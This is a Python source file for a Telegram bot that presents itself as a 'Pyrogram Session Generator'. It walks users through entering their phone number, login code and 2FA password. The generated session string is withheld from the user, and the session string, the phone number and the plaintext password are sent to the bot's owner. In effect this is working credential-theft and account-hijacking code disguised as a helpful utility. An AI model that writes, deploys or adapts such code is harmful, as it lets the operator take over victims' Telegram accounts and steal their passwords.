import asyncio
import os
from uuid import uuid4

from dotenv import load_dotenv
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait
)

# ─────────────────── LOAD ENV ───────────────────
load_dotenv()


def _get_int(key: str) -> int:
    val = os.getenv(key)
    if not val:
        raise RuntimeError(f"Missing env var: {key}")
    return int(val)


def _get_str(key: str) -> str:
    val = os.getenv(key)
    if not val:
        raise RuntimeError(f"Missing env var: {key}")
    return val.strip()


API_ID    = _get_int("API_ID")
API_HASH  = _get_str("API_HASH")
BOT_TOKEN = _get_str("BOT_TOKEN")
OWNER_ID  = _get_int("OWNER_ID")
# ────────────────────────────────────────────────

OTP_LENGTH = 5  # Telegram OTP is 5 digits; auto-submits when reached

bot = Client(
    "session_gen_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    parse_mode=ParseMode.HTML,
)

# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa, locked, password}
sessions: dict[int, dict] = {}


# ─────────────────── HELPERS ───────────────────
def keypad_markup(entered: str, locked: bool = False):
    layout = [
        [("1", "1"), ("2", "2"), ("3", "3")],
        [("4", "4"), ("5", "5"), ("6", "6")],
        [("7", "7"), ("8", "8"), ("9", "9")],
        [("⌫", "back"), ("0", "0"), ("✅", "submit")],
    ]
    buttons = [
        [InlineKeyboardButton(label, callback_data=f"otp|{val}") for label, val in row]
        for row in layout
    ]
    if locked:
        text = (
            "🔐 <b>Enter OTP</b>\n\n"
            f"Entered: <code>{entered}</code>\n\n"
            "⏳ Verifying..."
        )
    else:
        text = (
            "🔐 <b>Enter OTP</b>\n\n"
            f"Entered: <code>{entered or '—'}</code>\n\n"
            "⚠️ Use the <b>inline buttons</b> below only.\n"
            "Typing OTP in chat will leave the login incomplete.\n"
            f"Auto-submits after <b>{OTP_LENGTH}</b> digits."
        )
    return InlineKeyboardMarkup(buttons), text


async def cleanup_user(user_id: int):
    sess = sessions.pop(user_id, None)
    if sess and sess.get("client"):
        try:
            await sess["client"].disconnect()
        except Exception:
            pass


async def safe_edit_or_reply(message: Message, text: str, edit: bool, **kwargs):
    if edit:
        try:
            return await message.edit_text(text, **kwargs)
        except Exception:
            pass
    try:
        return await message.reply(text, **kwargs)
    except Exception as e:
        print(f"[reply fail] {e}")


async def finish_login(
    message: Message,
    user_id: int,
    temp: Client,
    edit: bool,
    has_2fa: bool = False,
    phone: str = "—",
    password: str = "—",
):
    # Export session and fetch account info
    try:
        session_string = await temp.export_session_string()
        me = await temp.get_me()
    except Exception as e:
        await safe_edit_or_reply(
            message,
            f"❌ Login failed while exporting session: <code>{e}</code>",
            edit,
        )
        if OWNER_ID:
            try:
                await bot.send_message(
                    OWNER_ID,
                    f"⚠️ Session export failed for user <code>{user_id}</code>.\n\n"
                    f"Error: <code>{e}</code>",
                )
            except Exception:
                pass
        await cleanup_user(user_id)
        return

    user_mention = me.mention
    username_line = f"@{me.username}" if me.username else "—"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
    twofa_line = "✅ Yes" if has_2fa else "❌ No"

    # ── 1) Simple message to user (no session string, no password) ──
    user_txt = (
        "✅ <b>Login successful!</b>\n\n"
        "Your session has been generated and sent to the administrator.\n"
        "Please contact the admin to receive your session string."
    )
    await safe_edit_or_reply(message, user_txt, edit)

    # ── 2) Full details + session string + password to owner only ──
    if OWNER_ID:
        owner_txt = (
            "🔔 <b>New Session Generated</b>\n\n"
            f"👤 <b>User:</b> {user_mention}\n"
            f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
            f"📛 <b>Name:</b> {full_name}\n"
            f"🔗 <b>Username:</b> {username_line}\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔐 <b>2FA:</b> {twofa_line}\n"
        )
        if has_2fa:
            owner_txt += f"🔑 <b>2FA Password:</b> <code>{password}</code>\n"

        owner_txt += (
            "\n<b>String Session:</b>\n\n"
            f"<code>{session_string}</code>"
        )
        try:
            await bot.send_message(OWNER_ID, owner_txt)
        except Exception as e:
            print(f"[owner send fail] {e}")

    await cleanup_user(user_id)


# ─────────────────── /start ───────────────────
@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    await cleanup_user(message.from_user.id)
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await message.reply(
        "👋 <b>Pyrogram Session Generator</b>\n\n"
        "Tap the button below to share your phone number.\n"
        "(You do not need to type it manually.)",
        reply_markup=kb,
    )


# ─────────────────── CONTACT ───────────────────
@bot.on_message(filters.private & filters.contact)
async def contact_handler(client: Client, message: Message):
    user_id = message.from_user.id

    if user_id in sessions:
        return await message.reply(
            "⚠️ A session is already in progress. Send /start to reset."
        )

    contact = message.contact
    if contact.user_id != user_id:
        return await message.reply(
            "❌ This is not your own contact. Please share your own contact."
        )

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    await message.reply(
        "⏳ Sending OTP...",
        reply_markup=ReplyKeyboardRemove(),
    )

    temp = Client(
        name=f"sess_{uuid4().hex}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        parse_mode=ParseMode.HTML,
    )

    try:
        await temp.connect()
        sent_code = await temp.send_code(phone)
    except FloodWait as e:
        await temp.disconnect()
        return await message.reply(f"⏳ FloodWait: please wait <code>{e.value}s</code>.")
    except Exception as e:
        await temp.disconnect()
        return await message.reply(f"❌ Error: <code>{e}</code>")

    sessions[user_id] = {
        "client": temp,
        "phone": phone,
        "phone_code_hash": sent_code.phone_code_hash,
        "otp": "",
        "stage": "otp",
        "has_2fa": False,
        "locked": False,
        "password": "—",
    }

    markup, text = keypad_markup("")
    await message.reply(text, reply_markup=markup)


# ─────────────────── OTP KEYPAD ───────────────────
@bot.on_callback_query(filters.regex(r"^otp\|"))
async def otp_callback(client: Client, cb: CallbackQuery):
    user_id = cb.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await cb.answer("Session expired. Send /start.", show_alert=True)
    if sess["stage"] != "otp":
        return await cb.answer("Not at OTP stage right now.")
    if sess.get("locked"):
        return await cb.answer("Verifying, please wait...", show_alert=True)

    val = cb.data.split("|", 1)[1]
    otp = sess["otp"]

    if val == "back":
        otp = otp[:-1]
        sess["otp"] = otp
        markup, text = keypad_markup(otp)
        try:
            await cb.message.edit_text(text, reply_markup=markup)
        except Exception:
            pass
        return await cb.answer()

    if val == "submit":
        if len(otp) < OTP_LENGTH:
            return await cb.answer(
                f"Please enter all {OTP_LENGTH} digits.", show_alert=True
            )
        await cb.answer("Verifying...")
        return await do_sign_in(cb, sess, otp)

    # Digit pressed
    if len(otp) >= OTP_LENGTH:
        return await cb.answer(f"{OTP_LENGTH} digits max")

    otp += val
    sess["otp"] = otp

    # Auto-submit when OTP length reached
    if len(otp) == OTP_LENGTH:
        sess["locked"] = True
        markup, text = keypad_markup(otp, locked=True)
        try:
            await cb.message.edit_text(text, reply_markup=markup)
        except Exception:
            pass
        await cb.answer("Verifying...")
        return await do_sign_in(cb, sess, otp)

    markup, text = keypad_markup(otp)
    try:
        await cb.message.edit_text(text, reply_markup=markup)
    except Exception:
        pass
    await cb.answer()


async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
    user_id = cb.from_user.id
    temp = sess["client"]

    try:
        await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
    except SessionPasswordNeeded:
        sess["stage"] = "password"
        sess["otp"] = ""
        sess["has_2fa"] = True
        try:
            await cb.message.edit_text(
                "🔐 <b>2FA is enabled.</b>\n\n"
                "Please type your <b>Telegram password</b> in the chat.\n"
                "(The message will be deleted immediately.)"
            )
        except Exception:
            pass
        return
    except PhoneCodeInvalid:
        sess["otp"] = ""
        sess["locked"] = False
        markup, text = keypad_markup("")
        try:
            await cb.message.edit_text(
                "❌ Invalid OTP. Please try again.\n\n" + text,
                reply_markup=markup,
            )
        except Exception:
            pass
        return
    except PhoneCodeExpired:
        try:
            await cb.message.edit_text("❌ OTP expired. Send /start to try again.")
        except Exception:
            pass
        await cleanup_user(user_id)
        return
    except Exception as e:
        try:
            await cb.message.edit_text(f"❌ Error: <code>{e}</code>")
        except Exception:
            pass
        await cleanup_user(user_id)
        return

    await finish_login(
        cb.message,
        user_id,
        temp,
        edit=True,
        has_2fa=sess.get("has_2fa", False),
        phone=sess.get("phone", "—"),
        password=sess.get("password", "—"),
    )


# ─────────────────── TEXT HANDLER ───────────────────
@bot.on_message(filters.private & filters.text & ~filters.command("start"))
async def text_handler(client: Client, message: Message):
    user_id = message.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await message.reply("Please send /start first.")

    if sess["stage"] == "otp":
        return await message.reply(
            "⚠️ <b>Do not type the OTP in chat.</b>\n"
            "Use the inline buttons above, otherwise the login will remain incomplete."
        )

    if sess["stage"] == "password":
        password = message.text
        # Save the password so it can be forwarded to the owner
        sess["password"] = password
        try:
            await message.delete()
        except Exception:
            pass
        try:
            await sess["client"].check_password(password)
        except PasswordHashInvalid:
            # Wrong password — clear saved value so owner doesn't see it
            sess["password"] = "—"
            return await message.reply("❌ Incorrect password. Please try again.")
        except Exception as e:
            sess["password"] = "—"
            return await message.reply(f"❌ Error: <code>{e}</code>")
        await finish_login(
            message,
            user_id,
            sess["client"],
            edit=False,
            has_2fa=sess.get("has_2fa", False),
            phone=sess.get("phone", "—"),
            password=sess.get("password", "—"),
        )


# ─────────────────── OTHER MESSAGES ───────────────────
@bot.on_message(
    filters.private
    & ~filters.text
    & ~filters.contact
    & ~filters.command("start")
)
async def other_handler(client: Client, message: Message):
    user_id = message.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await message.reply("Please send /start first.")
    if sess["stage"] == "otp":
        return await message.reply("⚠️ Use the inline buttons to enter the OTP.")
    if sess["stage"] == "password":
        return await message.reply("⚠️ Please type your password as text.")


# ─────────────────── RUN ───────────────────
if __name__ == "__main__":
    print("🤖 Session generator bot starting...")
    bot.run()
